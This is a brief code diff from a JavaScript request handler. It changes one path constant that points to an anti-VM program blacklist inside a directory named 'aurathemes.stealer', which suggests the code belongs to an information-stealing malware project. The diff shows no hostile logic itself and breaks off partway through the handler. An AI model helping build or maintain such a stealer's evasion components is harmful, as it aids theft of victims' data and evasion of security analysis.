@@ -1,6 +1,6 @@
 import fs from 'fs';
 import path from 'path';
-const blalistedPath = 'src/assets/scripts/aurathemes.stealer/json/antivm/blacklisted.progr.json';
+const blalistedPath = 'src/files/scripts/aurathemes.stealer/json/antivm/blacklisted.progr.json';
 export default async function handler(req, res) {
   try {
     if (
